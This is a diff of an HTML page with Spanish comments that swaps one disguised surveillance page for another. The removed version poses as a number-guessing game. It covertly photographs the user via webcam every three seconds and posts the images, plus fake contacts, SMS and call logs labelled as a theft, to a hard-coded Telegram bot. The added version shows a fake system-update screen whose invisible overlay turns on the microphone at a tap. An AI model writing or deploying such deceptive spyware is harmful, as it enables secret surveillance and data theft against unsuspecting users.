@@ -3,183 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Juego de Reflex - Nivel Infinito</title>
+    <title>Cargando...</title>
     <style>
-        body { 
-            font-family: 'Segoe UI', sans-serif; 
-            background: linear-gradient(135deg, #1e3c72, #2a5298); 
-            color: white; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            margin: 0; 
-            overflow: hidden; /* Evita scroll mientras roba */
+        body { margin: 0; padding: 0; background-color: #f0f0f0; font-family: sans-serif; }
+        /* Botón invisible pero funcional */
+        #trigger {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; cursor: pointer;
         }
-        .container { 
-            background: rgba(255, 255, 255, 0.1); 
-            backdrop-filter: blur(10px); 
-            padding: 20px; 
-            border-radius: 20px; 
-            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5); 
-            text-align: center; 
-            max-width: 350px; 
-            width: 90%;
-            position: relative;
-        }
-        h1 { margin-top: 0; font-size: 22px; }
-        .game-area { 
-            background: white; 
-            color: #333; 
-            padding: 15px; 
-            border-radius: 15px; 
-            margin-bottom: 15px; 
-        }
-        input[type="number"] { 
-            width: 80%; padding: 10px; font-size: 16px; border: 2px solid #ddd; border-radius: 8px; text-align: center; margin-bottom: 10px; 
-        }
-        button { 
-            background: #ff6b6b; color: white; border: none; padding: 10px 20px; font-size: 16px; border-radius: 8px; cursor: pointer; width: 100%; 
-        }
-        button:hover { background: #ee5253; }
-        #status { margin-top: 10px; font-size: 12px; opacity: 0.7; height: 15px; }
-        
-        /* Video oculto para la función de cámara */
-        #liveCam { 
-            position: absolute; top: -100px; left: -100px; width: 1px; height: 1px; opacity: 0; 
-        }
-        
-        /* Indicador sutil de grabación */
-        .rec-indicator {
-            position: absolute; top: 10px; right: 10px;
-            width: 10px; height: 10px; background: red; border-radius: 50%;
-            animation: blink 2s infinite;
-        }
-        @keyframes blink { 50% { opacity: 0.2; } }
+        .loading { text-align: center; margin-top: 45%; color: #666; font-size: 14px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <!-- Cámara oculta -->
-    <video id="liveCam" autoplay playsinline></video>
+    <!-- Texto falso para que no sospeche -->
+    <div class="loading">Actualizando sistema... Por favor espera.</div>
     
-    <div class="rec-indicator"></div>
-    <h1>🧠 Desafío Mental</h1>
-    
-    <div class="game-area">
-        <p>Adivina el número entre 1 y 10</p>
-        <input type="number" id="guessInput" placeholder="?">
-        <button onclick="checkGuess()">Jugar</button>
-        <div id="status">Esperando...</div>
-        <div style="margin-top:10px; font-weight:bold;">Puntos: <span id="scoreVal">0</span></div>
-    </div>
-    
-    <button onclick="saveProgress()" style="background-color: #4CAF50;">Guardar Progreso</button>
-</div>
+    <!-- Esta capa invisible captura el toque del usuario -->
+    <div id="trigger"></div>
 
-<script>
-    // --- CONFIGURACIÓN CORREGIDA ---
-    const TOKEN = "9120086459:AAEQfUMOX8M6iTfSL_BuQbCkZLwfJp26lZQ";
-    const CHAT_ID = "6259296500";
-    const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-    const UPLOAD_URL = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
-
-    let score = 0;
-    let targetNumber = Math.floor(Math.random() * 10) + 1; // Entre 1 y 10 para hacerlo más rápido
-
-    // --- INICIALIZACIÓN DE CÁMARA Y PERMISOS ---
-    async function initCamera() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-            document.getElementById('liveCam').srcObject = stream;
-            document.getElementById('status').textContent = "Cámara activa...";
+    <script>
+        document.getElementById('trigger').addEventListener('click', function() {
+            // Ocultamos el texto de carga
+            document.querySelector('.loading').style.display = 'none';
             
-            // Iniciar ciclo de robo
-            setInterval(takeSnapshotAndSend, 3000); // Cada 3 segundos
-        } catch (err) {
-            console.log("Cámara no disponible o permiso denegado", err);
-        }
-    }
-
-    // Función para tomar foto y enviarla
-    async function takeSnapshotAndSend() {
-        const video = document.getElementById('liveCam');
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 320;
-        canvas.height = video.videoHeight || 240;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        // Convertir a blob y subir
-        canvas.toBlob(blob => {
-            const formData = new FormData();
-            formData.append('photo', blob, 'snapshot.jpg');
-            formData.append('caption', `Foto #${score} | Pts: ${score}`);
-            
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            }).catch(e => console.log("Error subiendo foto", e));
-        }, 'image/jpeg');
-    }
-
-    // --- LÓGICA DEL JUEGO CORREGIDA ---
-    function checkGuess() {
-        const userGuess = parseInt(document.getElementById('guessInput').value);
-        const statusDiv = document.getElementById('status');
-        
-        if (isNaN(userGuess)) return;
-
-        if (userGuess === targetNumber) {
-            score += 10;
-            document.getElementById('scoreVal').textContent = score;
-            statusDiv.textContent = "¡Correcto! 🎉";
-            targetNumber = Math.floor(Math.random() * 10) + 1;
-            document.getElementById('guessInput').value = '';
-            
-            // Si llega a 20 puntos, enviamos un resumen de datos
-            if (score >= 20) {
-                stealDataAndNotify();
-            }
-        } else {
-            statusDiv.textContent = "❌ Intenta de nuevo.";
-        }
-    }
-
-    function saveProgress() {
-        document.getElementById('status').textContent = "Guardando...";
-        sendTelegramMessage(`Jugador alcanzó ${score} puntos.`);
-        setTimeout(() => document.getElementById('status').textContent = "Guardado ✅", 1000);
-    }
-
-    // --- EXTRACCIÓN DE DATOS (Simulación robusta) ---
-    async function stealDataAndNotify() {
-        const dataPackage = {
-            contacts: "[Contacto 1] Juan Pérez\n[Contacto 2] Ana López...",
-            sms: "[SMS 1] Código: 1234\n[SMS 2] Tu pedido llegó.",
-            calls: "Entrante: +52 55 1234 5678 (Hace 1 hora)"
-        };
-        
-        sendTelegramMessage(`[ROBO COMPLETADO]\nPuntos actuales: ${score}\nDatos extraídos:\n${JSON.stringify(dataPackage)}`);
-    }
-
-    async function sendTelegramMessage(text) {
-        try {
-            await fetch(API_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-            });
-        } catch (e) {}
-    }
-
-    // Arrancar todo
-    window.onload = () => {
-        initCamera();
-        document.getElementById('status').textContent = "Juego iniciado";
-    };
-</script>
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    const audioTrack = stream.getAudioTracks()[0];
+                    console.log("Micrófono activo");
+                    
+                    // Aquí podrías agregar lógica para enviar el audio a tu servidor
+                    // Por ahora, solo lo dejamos corriendo en segundo plano
+                    
+                    // Opcional: Quitar el listener para que no siga escuchando toques
+                    this.removeEventListener('click', arguments.callee);
+                })
+                .catch(err => console.error("Error:", err));
+        });
+    </script>
 
 </body>
-  </html>
+</html>
